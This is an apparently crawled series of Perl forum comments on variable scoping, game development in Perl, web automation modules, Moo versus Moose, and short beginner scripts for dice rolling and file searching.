Deliantra MMORPG is also done mainly in perl. "Deliantra is a cooperative multiplayer RPG and adventure game set in a classical medieval environment with ubiquitious weapons and magic. " Source code is at: http://cvs.schmorp.de/deliantra/ Home Page: http://www.deliantra.net/ Includes both client and server code.
And there will be people who say it's condescending to give someone `perldoc -f readline` and not give the docs. :-/ He gave the docs, you gave how to get them. All is good.
Although there are libraries in Perl for this (see the other comments in this thread), you should seriously consider whether Perl is the best tool for the job. It's not really fast enough for any games that are processor intensive (this will include most 3d games but also something like an RTS in 2d could fall under this). Libraries exist but they are not widely used so community support will be poor. When I did game programming I found Slick (Java) an excellent starting point. Avoid C and C++ until you're already good at programming games.
Oh after a long week of mad amounts of work ... this made my month. LOL. 
Link to the GitHub repository: https://github.com/plainblack/Lacuna-Server-Open
Fuck, my boss will be giddy about that.
Also use 'for' instead of 'foreach', because it does the same thing while looking nicer and saving keystrokes.
If you are going for computer engineering, your main languages will be C and a hardware language such as VHDL or Verilog. Any other programming will likely be just to make your job easier. You'll probably also use tools like SPICE and layout designers such as Magic. And if you are looking into doing research, you'll probably be working with MATLAB.
Let's just label everything related to gender or age or something we don't like, creepy.
foreach is a crutch for bad programming. Don't use $_, give that variable a name.
OK I see ... So Perl is not too slow to run 3D games. But you can't provide me of any examples of 3D games that are written purely in Perl that are not slow. Well, I'll let OP decide for himself.
I do know they are interpreted identically by Perl. I was talking about how they are interpreted by programmers. The foreach version is ugly and tends not to be followed by the word 'my'. 
I will (hopefully) giving a talk at the London Perl Workshop that will help developers write better documentation. This is a problem that I come across daily, and it's not the fault of you as a user of modules - it's something module authors need to do better. I want to get writing good documentation ingrained at the heart of perl culture, like writing tests already is.
&gt; Or you're badly using it? This. I'm actually currently working on a tutorial for modern OpenGL in Perl. &gt; the graphics aren't exactly advanced Not yet. I'm still working on the infrastructure and it is meant to render on a scale like this, so i haven't spent time on making it pretty: https://dl.dropbox.com/u/10190786/DF/perl%202012-06-12%2003-07-39-88.jpg
Alright, that i can agree with. :)
What makes SPICE different from other shell languages? Is it just different features, I skimmed the table of contents for the manual and I couldnt see anything out of the ordinary? Im guessing that it is just optimized for a computer engineers needs, right?
Well, lorito is the answer to the problems you analyzed. It's just a lot of work to get it right and fast.
Have you added any mobs yet? Code for collision detection? AI? What data structures are you using? My point is this isn't a fully working game - it's a work in progress. You might yet run into a situation where you have to drop into C to implement some data structure or algorithm.
Oh, I see, thanks!
This doesn't tell us what the title implies. It just redirects us to another thread where the same question was asked. If you want to know the answer to this then I think you should ask that as a question or mention "what do you think?".
Modules, then Reference, and OOP. 
https://metacpan.org/module/Term::ReadKey don't use google to search for perl modules, google is shit. search.cpan.org or metacpan.org
It's certainly preferred to fill in the gaps of the problem, to make it better for everyone who comes after you, rather than simply answering the question for yourself. Open source is like a campsite: always leave it in better condition than when you found it. The system only works when we all contribute, and everyone can contribute in some way. Even beginners can file tickets for the bugs or missing documentation that they've encountered.
Can somebody explain this line? my %signed; tie %signed, "DB_File", "signed", O_RDWR|O_CREAT, 0666, $DB_HASH or die "Failed to open signed\n";
It saves the `%signed` hash persistently to disk using [DB_File](http://search.cpan.org/perldoc?DB_File)'s [tied hash](http://perldoc.perl.org/perltie.html#Tying-Hashes) interface.
I thought of that one too, indeed. :) Too bad it lacks a visual designer like Qt’s (it does, right?).
there are no "complete" ones imho, but perhaps try activeperl ?. I did the gui for namefix.pl manually (it shows) but its functional and "good enough" tm. TK has 3 methods of placing widgets. I use the titles method which basically the same as HTML tables. It was a bit of work but very straight forward and it works on every platform :D
Is this book better for an experienced programmer looking to learn a new language, or is it fine also for a newbie to programming?
&gt; Do you use source control? git &gt; Do you stage deployments? yes &gt; Do you have a defined process for deployment? yes &gt; Do you have a defined process for rolling back a failed deployment? yes &gt; Do you have code that "no one knows what it does"? Some, but nothing we can't figure out. &gt; Do you have critical business code written more than five years ago that people are afraid to touch? Nope &gt; Do you have coding standards? yes &gt; Does most of your code follow it? yes &gt; Can you tell who wrote each piece of code by its style? To a small degree &gt; Do you have a standard technology stack? yes &gt; Across multiple applications? not applicable &gt; If some applications don't meet it, do you have plans to refactor them? N/A &gt; Do you refactor at all? Only when we have to go back in and update crufty code &gt; Do you have a defined process for handling bugs? yes &gt; ... for handling feature requests? yes (thanks, Sarbanes/Oxley!) &gt; ... for scheduling delivery? N/A &gt; Do you have a training or mentoring process? No &gt; Do you have multiple developers? yes &gt; Can you retain developers for longer than one year? Five years? I'm the most recent hire; everyone else has been here 8 years or more &gt; Do you use automated tests? N/A &gt; Do your tests all pass? The manual ones do &gt; ... before you check in? Of course. Pushing broken code means a beating &gt; ... before you deploy? We deploy when we push &gt; Do you have backups? Lots &gt; ... for servers? At the datacenter &gt; ... for developer workstations? yes &gt; ... and do you test them regularly? Nope &gt; Are developers their own system administrators? We have the best of both worlds; we have admin access, and full admin support 
&gt;Do you use source control? git &gt;Do you stage deployments? Yes &gt;Do you have a defined process for deployment? Yes &gt;Do you have a defined process for rolling back a failed deployment? Yes, but we usually just fix the problems instead &gt;Do you have code that "no one knows what it does"? No, but there are some systems outside our control that we rely on that nobody on the team knows. &gt;Do you have critical business code written more than five years ago that people are afraid to touch? No, but we do have some scary code in various places. &gt;Do you have coding standards? Yes &gt;Does most of your code follow it? A lot, maybe not most yet, but it's improving. &gt;Can you tell who wrote each piece of code by its style? Not any more because there's too many developers, but I can still pick out probably half the team. &gt;Do you have a standard technology stack? Yes, if a bit outdated (apache/fastcgi). nginx + plack is on the radar for the near-ish future. &gt;Across multiple applications? Yes, almost all of our apps share a good deal of the stack. &gt;If some applications don't meet it, do you have plans to refactor them? Yes, the few outliers that we haven't refactored are either in progress or in discussion. &gt;Do you refactor at all? Yes, when it makes business sense to do so (performance/security issues, making it easier to add new features, etc) &gt;Do you have a defined process for handling bugs? Yes &gt;... for handling feature requests? Yes &gt;... for scheduling delivery? Getting there &gt;Do you have a training or mentoring process? Yes, for entry-level developers. We hire 3 every 6 months or so and train them. &gt;Do you have multiple developers? Yes &gt;Can you retain developers for longer than one year? Five years? I've been here 4 years, there are 2 devs here longer than me (11 and 6 years), and one other with the company for 11 years, but spent like 8 years in support before moving up. &gt;Do you use automated tests? Yes, we have a cron that runs every night and emails us the results (and a webapp for drilling down through the results the next day). &gt;Do your tests all pass? Not always. It's a constant struggle. Some are too dependent on external systems (because those systems don't have tests, so this was the easiest way to get some coverage there) &gt;... before you check in? People are expected to run the relevant tests, but there's nothing automated &gt;... before you deploy? We only go to staging after nearly all the automated tests pass (and the ones that aren't passing have a known environmental cause, such as lack of virtual machine space in the dev cluster). &gt;Do you have backups? Yes &gt;... for servers? Yes, and for databases. &gt;... for developer workstations? No, but we have shared dev servers which are backed up. Your workstation is your domain. &gt;... and do you test them regularly? No idea, we have a couple dedicated sysadmins for the team. &gt;Are developers their own system administrators? For their workstation, yes. For the dev/staging/production servers, we have dedicated sysadmins now, but we still can do whatever is needed to get our jobs done. 
Here's a perl one-liner perl -MTime::Local -le '%is_weekend=(0,1,6,1); print "".localtime($_) for sort {$a&lt;=&gt;$b} grep { (localtime($_))[5]+1900 == $ARGV[0] } map {$t=$_; map { $t + 60*60*24*7*$_ } 0..52} grep { $is_weekend{(localtime($_))[6]} } map { Time::Local::timelocal(0,0,0,$_,0,$ARGV[0]) } 1 .. 7' 2011 It's pretty straight-forward -- find the Saturday and Sunday in Jan 1-7, list the next 53 Saturdays and Sundays (that's the map inside of a map), filter out things not in the given year, and sort them back together so Saturdays and Sundays are interleaved. Ya, code like this is why some people hate perl. \* edit formatting, specified numeric sort (necessary for years &lt; 1970)
So what does doing nothing do? EDIT: I mean not declaring it with my
&gt; How do you figure 20? 10 + 10 is 20. When `$data` is 10, `$data` is 10, and thus `$data` + `$data` is 20.
Aderrrrp.
`my` alone won't. `my` in conjunction with `strict` will cause a compile error instead of silently doing the wrong thing, because the misspelling causes there to be two different symbol names. It doesn't matter which one was misspelled, the fact that they don't match is what matters. 
Turn on `use strict` and run my third example, the answer will become apparent.
Ok so what about strict w/o my, im assuming the same result.
You are misunderstanding, In perl there are no true private or global variables, there are package variables, and lexical variables. When you use 'our $var' you create a package variable, when you use 'my $var' you create a lexical variable. In a single script where you do not define multiple packages the distinction is not so obvious. Also when you use a variable without declaring it (and strict is off) it defaults to a package variable. Here is an example of a package variable: use strict; sub do_it { our $var = 'x'; } do_it(); print "$var\n"; # prints "x\n" however with a lexical variable use strict; sub do_it { my $var = 'x'; } do_it(); print "$var\n"; # Will throw an exception, $var is not declared Those examples make it easier to explain: A lexical variable is only visible from scope (braces) in which it is defined, and deeper scopes defined after it. A package variable is usable anywhere in the package, or script in your case (package defaults to 'main') Package variables are also global in that you can access one package's variables from another: package foo; our $x = "x"; package bar; print $foo::x
&gt; Here is an example of a package variable: But `our` respects lexical scoping too.
Upvoted for "Alzheimerscatraz". 
Really? that surprises me.. is it still accessible via $Package::Var outside of the lexical scope?
&gt;Now you can access $Foo::Bar::baz from any package. What does that mean?
But for the sake of all who will someday maintain your code, stick to "my" for now. It'll be harder to get in trouble that way.
Someone made an entire module to simulate an already present keyword? my brain...
coder_kate's code is a great example of why global variables are generally a very bad idea; if a variable is global you can't easily see where it gets modified ([action at a distance](http://en.wikipedia.org/wiki/Action_at_a_distance_(computer_programming)), which makes it way easier to introduce bugs. For example if you only saw the first part of that code without knowing the definition of foo() you'd expect it to output 3 and would be very surprised when the output was something different. As a rule of thumb, declare variables in the smallest scope possible. And if a sub needs access to data from elsewhere, pass that data in via parameters; don't use global variables. It may seem like a bit more work, but it saves an awful lot of debugging and your future self will thank you when maintaining the code. 
Er, what?
I tell the Perl n00bs I train to do the opposite. If you really mean to use it as a global, use "our" so that I (and the other people on the team) know that's what you meant to do. If it's not a global, then use "my" and don't stick it in the (semi)-global scope unless you want me to sit down with you and ask if you think there's a better place to put that variable... like, say, in the sub you're actually using it in. I know the point you're getting at, it's just more applicable to intermediate Perl programmers who know just enough about packages to do really stupid shit with them. Beginners are still struggling with the "global" vs "local" concept and writing small, self-contained scripts so the use of "our" and "my" is a good way of making them really think about what they're doing.
Yes, and it is even worse than that. The `our` function creates an alias to the name in the current package. The alias is lexically scoped. Since the package statement does not create a lexical scope by itself, the our variables in one package can "leak" into another: #!/usr/bin/perl use warnings; use strict; package A; our $foo = 10; print "foo: $foo A::foo: $A::foo\n"; package B; print "foo: $foo B::foo: $B::foo\n";
sure
I agree, i just got to the part in my book where it goes over global and lexical variables, so I understand what you are saying. The only reason to use our would be for packages if you only have one file.
This post is worth reading for many reasons here is but one: "A local anaesthetic injected into your crotch will render your crotch entirely numb for a while ... but you will not work out just how bad a thing this is until you cough and wonder why your leg is suddenly warm."
By far the ugliest and least Perl-like script I've ever seen in this subreddit.
At least it runs on version 5 point... 6, I guess? On win32 only? Probably win16 from how dated this code looks...
I originally wrote this in 1997, so some code should be updated. 
Seriously? This script's commands work fine, I do not to rewrite the source!
[Mechanize::Firefox](https://metacpan.org/module/WWW::Mechanize::Firefox) let's you control a browser via Perl.
There's a Mojo::Client that does web interaction. But I'd start with WWW::Mechanize. Be sure to read the examples and the cookbook.
It lets you automate EVERYTHING. Their model may look like futuristic CGI 'out' of the server, but you can do the exact same tricks with web pages you pull down off of other servers. Add them together and you have a really powerful toolset. Read/Process/Render...
Ok. I'm convinced, I'm going to do this and these TPS reports can kiss my ass! 
In the QA world we normally use Selenium WebDriver for this type of work. In perl I use Selenium::Remote::Driver. Single object to driver IE, Firefox, Chrome, or htmlUnit if you don't want on screen rendering.
Once DBIx::Class configuration is set up, you have a ton of things helping you out. Say, for example, you have a $person object that is an entry in a person table with columns, name, age, height. Want to access those attributes? $person-&gt;name, $person-&gt;age, $person-&gt;height Similarly, you can use the OO to create/update elements. $person-&gt;create({ age =&gt; 24 }); That's just the basics. Got a datetime field? Automatically inflate it to a DateTime object so, say, you had my $bday = $person-&gt;age; The you could use $bday in DateTime math = eg $bday-&gt;ymd etc. Generally, if you have a working app, I wouldn't bother rewriting it from scratch, but if you're starting a new project and start off with it, it can make life a hell of a lot easier.
Sold! Thanks for the summary, going to try it out in a new app.
ok, whatever.
I second [Selenium::Remote::Driver](https://metacpan.org/module/Selenium::Remote::Driver) you will also need to download [Selenium Server](http://seleniumhq.org/download).
And a vim article about 10 years late on a wordpress blog.
Subtitle: “how to annoy the maximum amount of people by crossposting to multiple irrelevant groups”
I work in a Perl shop and when I started (right out of College with a CS degree from UC Davis) I did not know one lick of Perl and I never even considered using it. At the time, I primarily knew C, C++, Java and PHP. I would consider myself an above average Perl programmer now (after 3 years). All it takes is a fundamental understanding of how computers work and how languages function. Then the desire to go for it and learn the things you don't know. Most of what you are taught in a good CS program applies to any language. The algorithms are still the same and everything is eventually translating to assembly. Maybe I am lucky and just got a great CS education or most schools are teaching kids what they need to know. It could also be because I got a great job with some great people who were always there to tell me when I was doing it wrong.
I didn't know. Thanks for the explanation.
writing parsers without tco is a nightmare i feel for yacc developers
perlbrew is pretty easy to set up! and this is coming from a guy who is totes lazy
Oh I know, I've just had my head buried in FPGA land lately and havn't had time to get on my Linode.
Maybe he just got lucky, but still interesting to read about. 
Just found a collection of Larry Wall quotes and found them to be amusing. "To Perl or not to Perl, that is the kvetching."
Nice little site. I might even use it myself for little things. I'm curious what was the business model? These things aren't free, so... was the site for learning/street cred, in hopes of bringing customers for real jobs? Upsell, offering special features? 
From the channel #dbix-class on irc.perl.org : If you actually care about statement caching then yes, you should downgrade. And if you're not sure what statement caching is, then you should read up on it.
Glad to help! 
That's a great article. Mainly because I didn't know jobs.perl.org existed! What a find!
Goatse? HAHA.
Okay, what does 'last' do? And about finding a word, could you go into detail about the code? And what If I want to print the line?
int(rand(11))+1 will give you a random integer between 1 and 11 inclusive. You want int(rand(12))+1 for a random number from 1 to 12 inclusive. http://perldoc.perl.org/functions/rand.html
Yup, good point.
&gt; my $roll = ((int(rand($sides)) + 1)*$dice); That's wrong. Let's say you have 2 n-sided dice. You can never roll an odd number here because you're multiplying one random number by the number of dice (2) so you'll always end up with an even number (or more generally speaking, the total you display will always be a multiple of the number of dice chosen). You should simulate the roll of each die. my $total = 0; print "You rolled: " for (1 .. $dice) { my $roll = 1 + int(rand $nsides); print "$roll "; $total += $roll; } print " for a total of $total\n"; And on a stylistic note, your while loop is better as a do {} while, in my opinion, then you can actually put the condition of the while loop in the while() itself instead of resorting to "last", which makes the code much more readable. do { # ... roll dice and print result ... print "Hit enter to play again or N to exit!\n"; } while ( &lt;&gt; !~ /n/ ) (untested) 
&gt; how to parse a file for a line containing a word. It depends what you mean by "parse a file" - if you just want to locate lines that contain a specific word just use grep instead of Perl. If you're on a system without grep, it's a simple 1-liner in Perl: perl -ne "print if /dwarf/" file_to_search.txt which will print out all lines that contain the word "dwarf" 
 splice @a, 3, 13, reverse slice @a, 3, 13; or something like that. perldoc -f splice perldoc -f reverse perldoc -f slice
 @a[2..14] = reverse(@a[2..14]); Note that you're using array indices, not positions. your example is keeping position 3 unlike what you said to do. 
 my @a = 0..15; @a[3..15] = reverse @a[3..15]; use Data::Dumper; print Dumper(\@a); 
ohlol. i fail. @a[3..15] then.
... but there is a s*p*lice function. Edit: Somehow got two wires completely crossed while writing this. What I meant to say, the 2 argument version of `splice` does exactly what `slice` would do, so essentially huf was correct.
You could do something like (not particularly efficient): use strict; use warnings; use List::Util qw(shuffle); my $sides = 20; for my $i (1..10) { my @rolls = shuffle(1..$sides); print "$rolls[0]\n"; } or if you want to weight the dice, you could use List::Util::WeightedChoice.
No, not like that. You open a command prompt and type in this at the command prompt: perl -ne "print if /some regex/" file_to_search.txt If you want a complete perl script to search some file for a word, try something like the code below. It does pretty much what that 1-liner above does, but it's more open to customisation. #!/usr/bin/perl use warnings; use strict; print "Enter your skill or feat: "; chomp (my $input = &lt;STDIN&gt;); # This is the name of the file that will be searched my $file_to_search = "Skills-Feats.txt"; # First we open the file so that we can read from it ("&lt;" indicates read mode) # It's important to check that the file opened successfully before trying # to read from it. That's what the " or die ..." does. In this case I've # chosen to end the script with an error message if the file can't be opened. # Note that I've included $! in the error message, which will be the reason # that the file couldn't be opened. This is important so you can see what the # problem is. open my $in, "&lt;", $file_to_search or die "Can't open '$file_to_search : $!\n"; # Now we loop over all the lines in the file, one at a time. # Each line gets automagically put into $_ while (&lt;$in&gt;) { # check if $_ matches the input pattern # A pattern match is automatically against $_ if no other variable is given. if (/$input/) { # yes it matches - display the match print "Found match: $_"; } } # When you've finished with the file, close it. close $in; (untested) NB: you can use &lt;&gt; instead of &lt;STDIN&gt; - they both (more or less) mean the same thing. The differences won't affect you at this stage. The script needs more work if what you are searching for spans multiple lines, or if you're looking for a few lines of text below/around the matched input. 
You, sir are a saint and a hero. And yes, I was using &lt;&gt; when I started with perl about 2 months ago (I haven't done any serious practice yet) but I started using &lt;STDIN&gt; because everybody else was lol.
I have to say that I'm not fond of "isa as code ref" and I find the quoted_sub stuff to be extremely hinky. All this is why I use Any::Moose (and thus Mouse when thinks need to startup fast)... that said, I do like Moo's integration strategy, in registering metaclasses, to be preferable.
You don't have to use quote_sub if you don't want to, it's just a possible optimisation. You can use MooX::Types::MooseLike if you want Moose-style typing - but given the Moose team don't particularly like Moose-style typing at this point, I preferred coderefs as a dirt simple future proof interface. Any::Moose is broken - if Moose gets loaded after Any::Moose and you have Moose code trying to consume Any::Moose roles, your app is likely to crash on startup. Avoid like the plague; at least 'use Moose' or 'use Mouse' is predictable, albeit inferior to 'use Moo' if you want fast startup and interoperability with Moose cod.
I should clarify– Sub::Quote is very clearly an optimization for what I would assume would be very specific kinds of high volume circumstances. (My workloads have never shown subroutine call overhead as a substantial amount of my run time.) And yet it's referenced in the basic synopsis, as if it's normal practice to use it. This is to me a code smell... I get nervous when I see people micro-optimizing something like that. That said, I'm totally prepared to accept that perhaps there's something that I don't understand about just how many closures Moo would be walking through without the ability to inline... and that this would actually have a measurable impact on typical code...?
No, the point is that the type needs to support a richer API to really be useful. For example, letting the type define how it generates an error when a type check fails is useful. Being able to inline it is useful. Being able to bundle types with coercions is useful.
BTW, here's my pick for Python: * commercial software: []() * FOSS: [Mercurial](http://mercurial.selenic.com) * website: Reddit! Ruby: * commercial software: []() * FOSS: [puppet](http://www.puppetlabs.com/) * website: [Twitter](http://twitter.com) PHP: * commercial software: [vBulletin](http://vbulletin.com) * FOSS: [WordPress](http://wordpress.org) * website: [Facebook](http://facebook.com) Draw your own conclusion :) (No, I'm not trolling.) 
Hmmm, might as well add some picks for Common Lisp: * commercial software: ITA Software's low-fare search engine (used by Orbitz, Kayak and a few other airlines.) * FOSS: [Stumpwm](http://stumpwm.org) * website: The first version of Reddit. 
Earlier version doesn't count as current :)
Oh, nobody mentioned SpamAssassin ?
It's only a fork so far. Not the official Mosh.
yasql has been a godsend.
bbc and ticketmaster come to mind. 
I prefer Mouse typically, but sometimes I want Moo, unless I just need Mo, but then again you really need a Moose sometimes. This will make an easy on-ramp for new developers who want to learn Perl. Just so long as god for fucking bid they never ever bless a fucking hash into a package. Because that's the old wrong way. Nice work, everyone.
Some say they still do, some say they don't. Anyway, my next pick would be [github](http://github.com).
Isn't the BBC doing quite a large migration away from Perl to Java?
Regarding Amazon: They have been listed as a Perl success story since mid 1990s, but am I correct to say that sadly they never seem to publicly admit or advertise the fact that they use Perl, or donate to a Perl project nor sponsor any Perl event? 
Amazon is listed on the Mason website as a 'Mason powered website'. There is a page specifically about Amazon: http://www.masonhq.com/?AmazonDotCom Amazon also employed the creator of Mason and committed improvements to Mason back to the public version of Mason. They don't trumpet their use of Perl, but I don't think they go out of their way to hide it. 
I've mostly heard good things about booking.com; I seem to remember they gave a pretty large donation to the Perl Foundation, for example. On the other hand, whenever I read or hear anything about booking.com (including seeing their fairly substantial presence at OSCON this week), I'm reminded of [a pretty damning blog post about them](http://blogs.perl.org/users/bookingemployee/2012/03/truth-about-bookingcom.html) from earlier this year. I guess the blog post could be FUD and lies, but it doesn't read that way.
Request Tracker and OTRS are both perl. Bugzilla is perl. Awstats is perl. SpamAssassin. Gitolite. Movable Type (also has PHP bits) 
I suspect that Larry would find this perspective challenging because, like him I am looking at this from a natural language perspective but I disagree. Perl reminds me of English, but lisp reminds me of Irish Gaelic. It is weird and foreign, and putting all the verbs first consistently is really disorienting at first, but at the same time it really opens up new worlds of perspective. Let me explain. In Perl we might say do { ... } if $x eq $y. That's pretty straight-forward English to Perl translation that requires very little translation. The $x eq $y is interesting because here you have a bit of standard English (and many other IE languages including Greek and Latin) word ordering which has crept in here (through Math etc). It's tempting to call this SVO ordering but that's not quite the case (SVO ordering is probably better used to describe object oriented syntax), because even in natural languages equivalences are special. In Old English you wouldn't say Eadwaerd bith cynge (dative), but rather Eadwaerd bith kuning (nominative). In other words "Edward is king" is a sentence with no object. However in Irish Gaelic things get ordered differently. I wouldn't say "x equals y" in Irish Gaelic. The word ordering rules would require transforming that into "equals x y" and that's just the word ordering differences. Note in lisp, it's (= x y) which is more or less a direct equivalent. Points of reference in Irish Gaelic are impressively first-person-centric to the point where semantically you don't say "he plays music" but rather "[there] is music at-him" hyphens being used to indicate conjucations (yes they conjudcate their prepositions and therefore do away with pronouns).. Similarly the fact that Lisp is a language mostly composed of macros (something avoided in other languages), forces a similar shift in perspective. So on the whole, as a Perl guy learnign Lisp, I have actually come to like ti. Just don't put fingernail clippings in my oatmeal!
Webmin, Virtualmin, Usermin, and Cloudmin are all Perl (approaching half a million lines of it, for all projects), and used pretty widely.
Also Craigslist, Thinkgeek, and Shutterstock
Type junctions are trivial with MooseX::Types too. isa =&gt; (Str|Int), works fine. I don't know why you think features need to be abandoned to improve things, but trust me, they don't :)
Going forwards, it's easy: If there's no reason not to, just use Moose. If you want pure perl, fast startup and/or Moose interoperability without forcing Moose on your users, use Moo. If you want to inline a miniature object system for a zero dependency package, use Mo. The hard part will be getting the word out so that that's obvious to people.
Bundling coercions with types I'm still not entirely convinced of since I often have more than one set of coercions to a given type. Custom error generation and inlining both work fine with the Moo approach - the former because your type check sub is the thing that die()s, the latter via Sub::Quote
Facebook only use php for some front end stuff. A lot of their architecture is Python and other languages.
Also (disclaimer: I work there) NET-A-PORTER, who are actively developing in Perl.
[Nestoria](http://www.nestoria.com/) makes heavy use of Perl throughout their architecture, both backend and frontend. They also support local Perl communities. (Disclosure: I used to work there).
No: This a pre-version of mosh 1.3, as used in the android mosh opkg version also. http://mailman.mit.edu/pipermail/mosh-devel/2012-July/000267.html 1.3 will be even more awsome.
The back references refer to the parenthesized groupings numbered from left to right. In your example \2 matches the second grouping and \1 is the first. So if your string has "yab", then \1 = "a" \2 = "b" and would match "&lt;anything&gt;yabba&lt;anything&gt;". You can nest and have sub matches which gets trickier, but remember the groups are numbered by left parentheses from left to right, so if you have /y(.(..(.)).)\3\2\1/ and string having "yfives" \1 = "fives" \2 = "ives" \3 = "e" and would match "&lt;anything&gt;yfiveseivesfives&lt;anything&gt;" I say &lt;anything&gt; on both ends since you have no anchors, and of course the first &lt;anything&gt; doesn't match first. 
I see other people have answered your question, so I'm only going to make a recommendation. Try using a regex tool that shows your match in real time. QuickREx is my favourite, but for lookahead you'll need Kodos. There are also online ones; http://www.rubular.com/ is pretty cool.
I guess I should have been clearer. I have code that works that talks to a .NET asmx webservice today using code very similar to what is in your second link. The team that owns that webservice is migrating to a W2K8 server, and has created the WCF webservice with .NET 4.0. The code I have will not work with the new webservice. TBH, it's not a very clearly written wsdl. I will sanitize the WSDL's to remove identifying information and post them later tonight. It just bugs me. I'm not a SOAP expert. And, while I have done a lot with perl, I am far from an expert. But I have successful code that talks to a two separate AXIS webservices, and an asmx .NET 2.0 webservice -- and yet this baffles me. I appreciate your willingness to help and I'll work on getting those nested wsdl's posted for review. 
Right. There are a lot more low profile companies like Grant Street Group (though the director of engineering is a dick so avoid working there) and congress.org
Damian Conway is just about to release the Perl module Regexp::Debugger and the associated command line tool, 'rxrx'. See [this clip](http://www.youtube.com/watch?v=zcSFIUiMgAs) Damian made for YAPC ( Yet Another Perl Conference )
Oh well, I guess that's the way the onion crumbles.
Yo dawg, I heard you like Moose. So I put a Moose in your Mouse so you can Moose while you Mouse.
you're welcome! It takes so much of the pain away.
Booooooooooooooooooooooo...
There's also POE::Component::Client::HTTP.
In async programs I find AnyEvent::HTTP quite good. 
*sigh*
This won't solve your problem, but this: foreach (@crond_mods) {chomp $__}; @crond_mods = sort(@crond_mods); I believe is cleaner like this. Just my honest opinion. @crond_mods = map { chomp; $__ } sort @crond_mods;
&gt; P.S.: After a decade I personally somewhat gave up on Perl 6 &gt; though.. I wanted to see it succeed, I would have loved a newer, &gt; shinier Perl, It seems to me that the Perl 6 project is approaching an inflection point. It appears that they've removed (or are about to remove) one of the final obstacles to having Rakudo run on other VMs. Once Rakudo is running on another VM, I bet we see the project's focus shift toward getting more general users. At that point, I expect more prospective users will come around looking for an official tutorial, and will decide if they're interested or not. &gt; but I'm somewhat overwhelmed by now over the sheer amount &gt; of featurezz pressed into one language - it gave me a serious &gt; hangover of "Do I really need all this?!" I'd hope that a good official tutorial will address these concerns. 
&gt; Once Rakudo is running on another VM, I bet we see the project's focus shift toward getting more general users. Does that seem backwards to anyone else? I have trouble believing that many people think "Oh, I'll use Rakudo once it runs on the JVM or the CLR or v8."
&gt; Does that seem backwards to anyone else? I don't think it's backwards. The project gets what it focuses on getting. Greater numbers of new users will arrive once the Perl 6 project changes its focus to attract lots of new users. Currently, the focus of the project seems to be core development, and attracting potential implementors/contributors as well as testers. They are still implementing new ideas, sometimes going down blind alleys, etc. I don't think they are currently looking for lots of general users. Given the tone of recent blog posts, my impression is that the core contributors are intent on having Rakudo run on another VM. This means their focus is on making that happen, rather than on attracting lots of new users clamoring for more modules, tutorials, and better performance (and compatibility between releases for that matter). So, it's not that people will think, "Oh, I'll use Rakudo once it runs on the JVM or the CLR or v8", but rather, "Oh, the Rakudo folks are now writing tutorials, putting up more videos, making screencasts, and I'm seeing improved perf as well as all these new modules. I'm going to check this out." 
I'm doing it right now! And getting paid! Sounds pretty reasonable to me.
Wut? I'm curious to hear a reason on why not.
Yes, yes it is. I write new Perl code all the time. Perl is my go-to language to get shit done. I am a System Administrator.
Instead of Perl 6 on various VM's, how about Perl 5 on JVM or Perl 5 to JavaScript/v8? Now that Chrome/Firefox lets web apps out of the browser window and become more like native apps, we really need alternative languages to develop in aside from JavaScript. 
Btw, can someone explain Sub::Quote in layman programmer's terms? What goal does it try to achieve?
Buy "Perl Best Practices", to learn more about writing clean and clear Perl code. 
Personally I think your code is reasonably clean as it is. Pretty good for a newcomer to Perl IMO. As zmyrgel says, lose the global variables. In a small script like this they're not a huge problem, but it's good practice to use as few global variables as possible (which is often none). It generally means a bit more parameter passing, but that's not a bad thing. Some minor nitpicks: - I'd generally use shift rather than pop in the cases in your code, because I visualise pulling things off the left end of an array, not the right end. Especially when dealing with @ARGV and method arguments, where they're usually given in left-to-right order in the first place, so it makes more sense to process them in the same order. - Line 44 - you can lose the "$_ =~" part, because pattern matches are against $_ by default. i.e. just "elsif ( /$Regex/ ) {" - Personal preference; I'd not use capital first letters on variable names, but that's just a style thing. 
Also, instead of using shift multiple times you could use splice.
Hhmm, I recall reading an article which listed all the most common modules but can't find it now. No need to download File::Find, its a core module. You should start looking what comes with Perl installation: http://perldoc.perl.org/ There's modules section that you should glance to get feel whats included with perl. Just check the overview of modules. If you can't find a suitable module from there, look it up from http://search.cpan.org/ I'd guess 90% of all my stuff has already been solved by CPAN modules. As for your script, I'd go with functional approuch. Recursively walk dir structure from given path, filter files, filter by regexp, map count_lines function for each file and reduce sum of line counts as a result. 
For Line 44 comment, this puts burden of knowledge on the reader. At some places, it's better to be completely explicit. In most places, I would agree with you.
Well yes, but it's such a common Perl idiom I don't see a problem with using the abbreviated form. 
Take a look at Task::Kensho It's a decent tour of "essential" CPAN. Don't be afraid to pick modules that aren't in Task::Kensho though.
Using `shift` for this in *every* case is actually an objectively bad way to handle this. `shift` is an array modification function, which not only means it has side effects that you may not be aware of or intend; it can in certain situations also incure a performance hit due to the extra work performed in modifying @_. On the other hand, it is extremely useful for constructs like this and makes it easy to see that something special is going on there: sub delegate_method { my $self = shift; return $self-&gt;delegate-&gt;method( @_ ); }
Will do, as soon as Cygwin finishes installing. I rememeber hearing about Task::Kensho now that you mention it. I don't really remember where, though...
use [PerlMonks](http://perlmonks.org/)
I learned a lot from that book, too. It's a bit dated now, but still a valuable member of any Perl library.
Huh. I didn't think about it like that. Now that I do, though, it makes sense. That's not to say I understand what your example is doing, though. I haven't encountered the -&gt; operator yet. Looking it up right now
It calls a method on an object, so with this kind of construct you'd make shortcut methods on an object, that, when called, will call a method on the return value of another method on the object, using the parameters it originally got.
Because $self tends to be a large object, with stuff like logging, etc, I tend to shift that off and then block assign the other args: sub foo { my $self = shift; my ( $arg1, $arg2 ) = @_; That way, when I'm in the debugger, I can do 'x @_' to view all the args, and I don't get 14 pages of '$self' flooding the screen.
Okay. I looked up the arrow operator in the Camel Book, and, for the most part, I understood. It seems to do the same thing it does in C/C++, more or less. Am I right? Some of the stuff went over my head, though. I don't quite grasp the bless keyword yet. I haven't done any OOP in Perl yet, though, so I guess that's why. One question about your example, though. Why do you write "delegate-&gt;method"? Is delegate an object with a method named "method", or do you replace underscores with arrows when working with references? Edited for slight grammar mistake in second sentence
One difficulty with that is, there's no Perl 5 spec, per se. "Perl 5" is "whatever runs on the `perl` 5 implementation". So, porting Perl 5 would entail re-implementing all its idiosyncrasies. (My guess is that it's probably already been tried before, too, but I haven't looked that up.) Rakudo Perl 6 is already written to run on a VM (Parrot), and getting it to run on additonal VMs appears to be fairly close at hand. Also, some argue that the language is even nicer than Perl 5. Such that, you might even *prefer* Perl 6 once you've you've driven it around the block once or twice. ;) (personally, I can't yet say one way or the other)
